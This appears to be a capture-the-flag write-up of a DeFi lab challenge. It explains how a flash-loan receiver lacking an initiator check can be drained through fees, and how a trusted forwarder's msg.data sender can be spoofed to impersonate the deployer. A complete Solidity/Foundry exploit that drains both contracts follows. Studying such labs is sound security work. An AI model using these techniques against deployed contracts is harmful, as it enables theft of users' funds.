# About the protocol

A user deployed a sample contract with 10 wETH in balance, looking like it can execute flash loans of wETH.
All funds are at risk! Rescue all wETH from the user and the pool and deposit it into the designated recovery account.

Empty out the wETH user
    The only way to empty out this person is getting him on the fee because it is a fixed amount. 
    In the onFlashLoan, it has not defined which address, just an address. This means no context and the flashLoan can be requested on his behalf 
    
    On normal implementation, call address initiator recognised by the Lender which is usually the contract calling the borrower

Recover the amount from the pool
    We need to impersonate a the correct msgSender in order to empty out the account. 
    This is made possible with the fact that there's an intermediary. `BasicForwarder`

## Logic
There is a fixed fee of 1wETH on each loan

- onFlashLoan()
    Access control problem, it ignores the first address which is essentially the initiator of the flash loan. 
    This means anyone can request flash loans on his behalf, the receiver has to pay the fee and loan back.

    `_msgSender()` We can craft a transaction that comes from the trusted forwarder and since we control the msg.data. 
    we can make sure the last 20 bytes are any address of any account that we wish to control
    Allowing us to impersonate and call withdraw()

## Implementation
```javascript

function test_naiveReceiver() public checkSolvedByPlayer {
        /**
         * We have to call the multicall with 11 calls to empty out the wETH user
         */
        bytes[] memory callDatas = new bytes[](11);

        //Encode flash loan call - on behalf of the Naive receiver of the loan
        for (uint i = 0; i < 10; i++) {
            callDatas[i] = abi.encodeCall(
                NaiveReceiverPool.flashLoan,
                (receiver, address(weth), 1, "0x")
            ); //We are filling the static array callDatas with the necessary encoded calls to call.
            //function we want to call and the parameters to pass
        }
        // Above are 10 calls pumped into callDatas
        // The 11th call into callDatas, is the one to empty out the pool.

        //encoding the 11th call
        callDatas[10] = abi.encodePacked(
            abi.encodeCall(
                NaiveReceiverPool.withdraw,
                (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
            ),
            bytes32(uint256(uint160(deployer)))
            /*This is encoding the deployer address to the call to be passed to the basic forwarder.
             *This is because we need to have the last 20 bytes equal to that of the deployer for impersonation.*/
        );
        /**
         * We are deploying and making the call on behalf of the deployer
         */

        //Encode and ready for the multicall
        bytes memory multicallData = abi.encodeCall(pool.multicall, callDatas);
        //pool.multicall because pool is multicall i.e. inherited into it this

        //Now we want to make sure the call goes through the basic forwarder
        //Create the request for the forwarder
        BasicForwarder.Request memory request = BasicForwarder.Request(
            player,
            address(pool),
            0,
            gasleft(),
            forwarder.nonces(player),
            multicallData,
            1 days
        );
        //Above it is BasicForwarder and not the initialized instance of the forwarder. This because of the reference to the imported version. The basic forwarder has to be a standing logic by itself.
        /**
         * forwarder.nonces(player), //This is like this because it needs call from the initialized instance
         */

        //Now we create a requestHash
        bytes32 requestHash = keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                forwarder.getDataHash(request)
            )
        );

        //Sign the requestHash
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        // Execute request
        forwarder.execute(request, signature);
    }
```



